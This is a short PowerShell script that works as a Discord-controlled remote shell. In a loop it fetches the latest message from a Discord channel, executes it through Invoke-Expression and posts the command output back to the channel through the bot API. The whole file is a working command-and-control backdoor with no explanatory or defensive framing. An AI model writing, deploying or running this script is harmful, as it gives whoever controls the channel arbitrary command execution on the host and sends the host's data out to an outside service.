param (
    [string]$Token,
    [string]$ChannelID
)

$Header = @{ Authorization = "Bot $Token" }
$BaseURL = "https://discord.com/api/v10/channels/$ChannelID/messages"

function Send-DiscordMessage {
    param (
        [string]$msg
    )
    $body = @{ content = $msg } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $BaseURL -Method Post -Headers $Header -Body $body -ContentType "application/json"
}

function Get-LastCommand {
    $res = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
    return $res[0].content
}

$last = ""

while ($true) {
    try {
        $cmd = Get-LastCommand
        if ($cmd -ne $last -and $cmd -notmatch "^!") {
            $output = Invoke-Expression $cmd | Out-String
            Send-DiscordMessage "```\n$output`n```"
            $last = $cmd
        }
    }
    catch {
        Send-DiscordMessage "ERROR: $($_.Exception.Message)"
    }
    Start-Sleep -Seconds 5
}